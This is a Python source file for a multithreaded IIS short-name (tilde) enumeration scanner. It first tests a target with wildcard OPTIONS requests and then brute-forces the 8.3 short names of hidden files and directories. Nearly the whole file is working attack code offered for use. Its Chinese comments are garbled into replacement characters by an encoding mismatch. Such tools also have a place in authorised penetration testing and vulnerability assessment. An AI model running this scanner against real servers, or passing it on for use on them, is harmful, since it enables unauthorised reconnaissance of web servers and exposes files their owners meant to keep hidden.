# encoding=gbk
# An IIS short_name scanner   my[at]lijiejie.com  http://www.lijiejie.com
# python2 Modified by ABC_123
# python3 Modified by looks3Mz

import queue
import http.client
import string
import sys
import threading
import time
import urllib.parse


class Scanner():
    def __init__(self, target):
        # ��ʼ��Ŀ����ַ������URL
        self.target = target
        self.scheme, self.netloc, self.path, params, query, fragment = urllib.parse.urlparse(target)

        # ��֤·���� '/' ��β
        if self.path[-1:] != '/':
            self.path += '/'

        # ����ɨ�����Ч�ַ���
        self.payloads = list('abcdefghijklmnopqrstuvwxyz0123456789_-')
        self.files = []  # �洢�ҵ����ļ�
        self.dirs = []  # �洢�ҵ���Ŀ¼
        self.queue = queue.Queue()  # ɨ���������
        self.lock = threading.Lock()  # ���������̰߳�ȫ
        self.threads = []  # �洢�̶߳���

    def _conn(self):
        """������Ŀ���������HTTP/HTTPS����"""
        try:
            if self.scheme == 'https':
                conn = http.client.HTTPSConnection(self.netloc)
            else:
                conn = http.client.HTTPConnection(self.netloc)
            return conn
        except Exception as e:
            print('[Exception in function _conn]', e)
            return None

    def _get_status(self, path):
        """��ȡĿ��·����HTTP��Ӧ״̬��"""
        for i in range(3):
            try:
                conn = self._conn()
                conn.request('OPTIONS', path)
                status = conn.getresponse().status
                conn.close()
                return status
            except Exception as e:
                print('[Exception in function _get_status]', e)
                time.sleep(3)

    def is_vul(self):
        """���������Ƿ����IIS���ļ���©��"""
        try:
            status_1 = self._get_status(self.path + '/*~1****/a.aspx')  # �Ѵ��ڵ��ļ�/Ŀ¼
            status_2 = self._get_status(self.path + '/l1j1e*~1****/a.aspx')  # �����ڵ��ļ�/Ŀ¼
            if status_1 == 404 and status_2 == 200:
                return True
            return False
        except Exception as e:
            raise Exception('[Exception in function is_val] %s' % str(e))

    def run(self):
        """��ʼɨ�裬�����̳߳ؽ��в���ɨ��"""
        # �Ӹ�·����ʼ�����ɳ�ʼɨ������
        for payload in self.payloads:
            self.queue.put((self.path + payload, '****'))  # �ļ�������չ��

        # ����10���߳�
        for i in range(10):
            t = threading.Thread(target=self._scan_worker)
            self.threads.append(t)
            t.start()

    def report(self):
        """�ȴ������߳���ɺ����ɨ����"""
        for t in self.threads:
            t.join()

        self._print('-' * 64)
        for d in self.dirs:
            self._print('Dir:  ' + d)
        for f in self.files:
            self._print('File: ' + f)
        self._print('-' * 64)
        self._print('%d Directories, %d Files found in total' % (len(self.dirs), len(self.files)))

    def _print(self, msg):
        """�̰߳�ȫ�������Ϣ"""
        self.lock.acquire()
        print(msg)
        self.lock.release()

    def _scan_worker(self):
        """ɨ������Ĺ����߳�"""
        while True:
            try:
                # ��ȡ����ɨ��·������չ��
                url, ext = self.queue.get(timeout=6)

                # ���·���Ƿ񷵻�404״̬��
                status = self._get_status(url + '*~1' + ext + '/1.aspx')
                if status == 404:
                    self._print('Found ' + url + ext + '\t[scan in progress]')

                    # ���·������С��6���������������
                    if len(url) - len(self.path) < 6:
                        for payload in self.payloads:
                            self.queue.put((url + payload, ext))
                    else:
                        # ��չ��ö��
                        if ext == '****':  # ��չ����ʼ״̬
                            for payload in string.ascii_lowercase:
                                self.queue.put((url, '*' + payload + '**'))
                            self.queue.put((url, ''))  # Ҳ�������ļ���
                        elif ext.count('*') == 3:
                            for payload in string.ascii_lowercase:
                                self.queue.put((url, '*' + ext[1] + payload + '*'))
                        elif ext.count('*') == 2:
                            for payload in string.ascii_lowercase:
                                self.queue.put((url, '*' + ext[1] + ext[2] + payload))
                        elif ext == '':
                            self.dirs.append(url + '~1')
                            self._print('Found Dir ' + url + '~1\t[Done]')
                        elif ext.count('*') == 1:
                            self.files.append(url + '~1.' + ext[1:])
                            self._print('Found File ' + url + '~1.' + ext[1:] + '\t[Done]')
            except Exception as e:
                break


# �ű����
if len(sys.argv) == 1:
    print('Usage: %s target' % sys.argv[0])
    sys.exit()

# ��ȡĿ��URL������ɨ��
target = sys.argv[1]
s = Scanner(target)

# ����Ƿ����©��
if not s.is_vul():
    print('Sorry, server is not vulnerable')
    sys.exit(0)

# �������©������ʼɨ��
print('Server is vulnerable, please wait, scanning...')
s.run()
s.report()
